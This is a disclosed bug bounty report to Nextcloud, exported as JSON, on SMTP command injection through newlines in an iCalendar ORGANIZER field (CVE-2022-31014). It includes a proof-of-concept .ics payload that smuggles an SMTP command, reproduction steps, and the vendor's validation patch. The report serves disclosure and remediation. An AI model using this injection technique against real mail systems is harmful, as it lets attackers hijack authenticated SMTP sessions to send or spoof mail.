@@ -1,0 +1,602 @@
+{
+  "id": 1516377,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTE2Mzc3",
+  "url": "https://hackerone.com/reports/1516377",
+  "title": "SMTP Command Injection in iCalendar Attachments to Emails via Newlines",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-03-19T08:41:01.607Z",
+  "submitted_at": "2022-03-19T08:41:01.706Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "spaceraccoon",
+    "url": "/spaceraccoon",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-31014"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-07-04T13:10:26.031Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-04T13:10:25.944Z",
+  "team_member_agreed_on_going_public_at": "2022-07-04T11:08:30.572Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Note: This is similar to {1509216}, but has a new source/attack vector. Apologies for not picking this up earlier.\n\n## Summary:\nWhen users receive iCalendar attachments in Mail, there is an option to add it to their calendar:\n\n██████████\n\nOnce they add it to calendar, a PUT request is sent:\n\n```\nPUT /remote.php/dav/calendars/nextcloud/personal/██████.ics HTTP/2\nHost: 192.168.92.132\n\nBEGIN:VCALENDAR\nPRODID:-//Nextcloud Mail\nBEGIN:VTIMEZONE\nTZID:Asia/Singapore\nBEGIN:STANDARD\nTZOFFSETFROM:+0800\nTZOFFSETTO:+0800\nTZNAME:+08\nDTSTART:19700101T000000\nEND:STANDARD\nEND:VTIMEZONE\nBEGIN:VEVENT\nCREATED:20220319T044448Z\nDTSTAMP:20220319T080250Z\nLAST-MODIFIED:20220319T080250Z\nSEQUENCE:2\nUID:a027641d-9f3a-4570-8cff-aa5cde0ba323\nDTSTART;TZID=Asia/Singapore:20220322T100000\nDTEND;TZID=Asia/Singapore:20220322T110000\nSTATUS:CONFIRMED\nSUMMARY:Normal Event\nATTENDEE;CN=nextcloud;CUTYPE=INDIVIDUAL;PARTSTAT=DECLINED;ROLE=REQ-PARTICIP\n ANT;RSVP=TRUE;LANGUAGE=en:mailto:███\nORGANIZER;CN=Normal User:mailto:<ORGANIZER EMAIL>\nEND:VEVENT\nEND:VCALENDAR\n```\n\nAt the same time, an SMTP pipelined command is sent to the email server to email <ORGANIZER EMAIL> that the user has accepted the event.\n\nUnfortunately, since `<ORGANIZER EMAIL>` is not sanitized, if an attacker sends a poisoned iCalendar file with newlines in the `ORGANIZER` property, this will inject newlines in the pipelined SMTP commands, allowing the attacker to inject arbitrary SMTP commands.\n\nThese commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.\n\nFor example, an attacker can inject a simple `EHLO a` command:\n\n```\nBEGIN:VCALENDAR\nCALSCALE:GREGORIAN\nVERSION:2.0\nPRODID:-//Nextcloud Mail\nBEGIN:VEVENT\nCREATED:20220319T044448Z\nDTSTAMP:20220319T080250Z\nLAST-MODIFIED:20220319T080250Z\nSEQUENCE:2\nUID:a027641d-9f3a-4570-8cff-aa5cde0ba323\nDTSTART;TZID=Asia/Singapore:20220322T100000\nDTEND;TZID=Asia/Singapore:20220322T110000\nSTATUS:CONFIRMED\nSUMMARY:Normal Event\nATTENDEE;CN=nextcloud;CUTYPE=INDIVIDUAL;PARTSTAT=DECLINED;ROLE=REQ-PARTICIP\n ANT;RSVP=TRUE;LANGUAGE=en:mailto:████\nORGANIZER;CN=Normal User:mailto:test(\\nEHLO a\\n)@gmail.com\nEND:VEVENT\nBEGIN:VTIMEZONE\nTZID:Asia/Singapore\nBEGIN:STANDARD\nTZOFFSETFROM:+0800\nTZOFFSETTO:+0800\nTZNAME:+08\nDTSTART:19700101T000000\nEND:STANDARD\nEND:VTIMEZONE\nEND:VCALENDAR\n```\n\nWhich for Gmail would return:\n\n```\n{\"status\":\"error\",\"message\":\"Could not send mail: Expected response code 354 but got code \\\"250\\\", with message \\\"250-smtp.gmail.com at your service, [116.89.6.224]\\r\\n250-SIZE 35882577\\r\\n250-8BITMIME\\r\\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\\r\\n250-ENHANCEDSTATUSCODES\\r\\n250-PIPELINING\\r\\n250-CHUNKING\\r\\n250 SMTPUTF8\\r\\n\\\"\",\"data\":{\"type\":\"OCA\\\\Calendar\\\\Exception\\\\ServiceException\",\"message\":\"Could not send mail: Expected response code 354 but got code \\\"250\\\", with message \\\"250-smtp.gmail.com at your service, [116.89.6.224]\\r\\n250-SIZE 35882577\\r\\n250-8BITMIME\\r\\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\\r\\n250-ENHANCEDSTATUSCODES\\r\\n250-PIPELINING\\r\\n250-CHUNKING\\r\\n250 SMTPUTF8\\r\\n\\\"\",\"code\":250,\n```\n\nNote that for this report, the commands are blind; but can be used remotely if changing the sender/recipient. I added additional logging to `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to confirm that the commands were injected.\n\n## Steps To Reproduce:\n\nNote: Email sending should be set up in the admin settings.\n\nSetup `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to log SMTP commands. I inserted the following at line 343: `file_put_contents('/tmp/test.log',$response,FILE_APPEND);` (under `$response = $this->getFullResponse($seq);`). I also inserted the following at line 327: `file_put_contents('/tmp/test.log',$command,FILE_APPEND);` (below `$failures = (array) $failures;`).\n\n  1. At an external email, send the victim nextcloud email the attachment ███████. Modify `█████` in the file to the victim's email. \n  2. As the victim, check email in nextcloud.  Click the 3 dots beside `event.ics` > Import into Calendar > Personal. This triggers the PUT request.\n  3. Check `/tmp/test.log`. Confirm that the newlines and arbitrary `EHLO a` SMTP commands have been injected and sent to the server.\n\n## Impact\n\nThe impact varies based on which commands are supported by the backend SMTP server. However, the main risk here is that the attacker can then hijack an already-authenticated SMTP session and run arbitrary SMTP commands as the email user, such as sending emails to other users, changing the FROM user, and so on. As before, this depends on the configuration of the server itself, but newlines should be sanitized to mitigate such arbitrary SMTP command injection.",
+  "weakness": {
+    "id": 69,
+    "name": "CRLF Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2022-08-03T11:08:30.684Z",
+  "allow_singular_disclosure_after": -35927608.201154366,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "tsyogesh40",
+    "njmulsqb",
+    "spaceraccoon",
+    "drsniper",
+    "zy9ard3",
+    "yassinek3ch",
+    "imranhudaa",
+    "kmxx",
+    "salahhasoneh",
+    "shivammusic",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68217,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/calendar",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 15944114,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+      "automated_response": true,
+      "created_at": "2022-03-19T08:41:02.207Z",
+      "updated_at": "2022-03-19T08:41:02.207Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 15944133,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Note: I tested this on the latest update 3.2.2 that patched #1509216, and it still works.",
+      "automated_response": false,
+      "created_at": "2022-03-19T08:41:44.538Z",
+      "updated_at": "2022-03-19T08:41:44.538Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 15968388,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-03-21T15:16:58.399Z",
+      "updated_at": "2022-03-21T15:16:58.399Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "Medium (4.1)",
+        "old_severity_id": 1437809,
+        "new_severity_id": 1439481
+      },
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 15968401,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "thanks for the report, we reproduced it and forwarded it to the engineering team",
+      "automated_response": false,
+      "created_at": "2022-03-21T15:18:29.157Z",
+      "updated_at": "2022-03-21T15:18:29.157Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 15991927,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can you confirm the following patch fixes it?\n\n```diff\ndiff --git a/apps/dav/lib/CalDAV/Reminder/NotificationProvider/EmailProvider.php b/apps/dav/lib/CalDAV/Reminder/NotificationProvider/EmailProvider.php\nindex 456b9f8b42..d5d2d2923e 100644\n--- a/apps/dav/lib/CalDAV/Reminder/NotificationProvider/EmailProvider.php\n+++ b/apps/dav/lib/CalDAV/Reminder/NotificationProvider/EmailProvider.php\n@@ -272,7 +272,10 @@ class EmailProvider extends AbstractProvider {\n                                        $emailAddressesOfDelegates = $delegates->getParts();\n                                        foreach ($emailAddressesOfDelegates as $addressesOfDelegate) {\n                                                if (strcasecmp($addressesOfDelegate, 'mailto:') === 0) {\n-                                                       $emailAddresses[substr($addressesOfDelegate, 7)] = [];\n+                                                       $delegateEmail = substr($addressesOfDelegate, 7);\n+                                                       if ($delegateEmail !== false && $this->mailer->validateMailAddress($delegateEmail)) {\n+                                                               $emailAddresses[$delegateEmail] = [];\n+                                                       }\n                                                }\n                                        }\n \n@@ -345,7 +348,13 @@ class EmailProvider extends AbstractProvider {\n                        return null;\n                }\n \n-               return substr($attendee->getValue(), 7);\n+               $attendeeEMail = substr($attendee->getValue(), 7);\n+\n+               if ($attendeeEMail === false || !$this->mailer->validateMailAddress($attendeeEMail)) {\n+                       return null;\n+               }\n+\n+               return $attendeeEMail;\n        }\n \n        /**\n```",
+      "automated_response": false,
+      "created_at": "2022-03-23T08:18:51.619Z",
+      "updated_at": "2022-03-23T08:18:51.619Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16069730,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nickvergessen , yep, looks good, thank you!",
+      "automated_response": false,
+      "created_at": "2022-03-29T15:50:54.813Z",
+      "updated_at": "2022-03-29T15:50:54.813Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16143398,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the feedback, I forwarded it to the product team and we will include it in the next release then",
+      "automated_response": false,
+      "created_at": "2022-04-04T09:51:57.798Z",
+      "updated_at": "2022-04-04T09:51:57.798Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16792990,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nIf you have a GitHub account please let us know the username, and we will associate it with the advisory.\n",
+      "automated_response": false,
+      "created_at": "2022-05-20T13:20:26.070Z",
+      "updated_at": "2022-05-20T13:20:26.070Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "spaceraccoon",
+        "url": "/spaceraccoon"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16792997,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-05-20T13:21:11.312Z",
+      "updated_at": "2022-05-20T13:21:11.312Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "nextcloud",
+      "collaborator": {
+        "username": "spaceraccoon",
+        "url": "/spaceraccoon"
+      }
+    },
+    {
+      "id": 16793178,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We plan to release public advisories for this issue on 09.06.2022. We've added a draft version of the advisory as summary to this report:\nhttps://github.com/nextcloud/security-advisories/security/advisories/GHSA-264h-3v4w-6xh2\n\nPlease let us know if you wish any changes to the advisory. (PS you can not access it until we added you)",
+      "automated_response": false,
+      "created_at": "2022-05-20T13:37:14.245Z",
+      "updated_at": "2022-05-20T13:37:14.245Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16860243,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nickvergessen , please add spaceraccoon on GitHub for credits. Thanks!",
+      "automated_response": false,
+      "created_at": "2022-05-25T16:40:11.388Z",
+      "updated_at": "2022-05-25T16:40:11.388Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16862827,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Added",
+      "automated_response": false,
+      "created_at": "2022-05-25T21:46:00.411Z",
+      "updated_at": "2022-05-25T21:46:00.411Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 16965828,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-06-02T06:52:43.361Z",
+      "updated_at": "2022-06-02T06:52:43.361Z",
+      "cve_ids": [
+        "CVE-2022-31014"
+      ],
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 17403171,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-07-04T11:08:30.603Z",
+      "updated_at": "2022-07-04T11:08:30.603Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 17403351,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nickvergessen , could the emails and attached images in the report be redacted before disclosure?",
+      "automated_response": false,
+      "created_at": "2022-07-04T11:30:00.512Z",
+      "updated_at": "2022-07-04T11:30:00.512Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 17403878,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Done",
+      "automated_response": false,
+      "created_at": "2022-07-04T12:12:37.931Z",
+      "updated_at": "2022-07-04T12:12:37.931Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 17404411,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-07-04T13:10:25.987Z",
+      "updated_at": "2022-07-04T13:10:25.987Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 17404412,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-07-04T13:10:26.097Z",
+      "updated_at": "2022-07-04T13:10:26.097Z",
+      "actor": {
+        "username": "spaceraccoon",
+        "cleared": true,
+        "verified": true,
+        "url": "/spaceraccoon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 154781,
+      "category": "team",
+      "content": "Advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-264h-3v4w-6xh2",
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
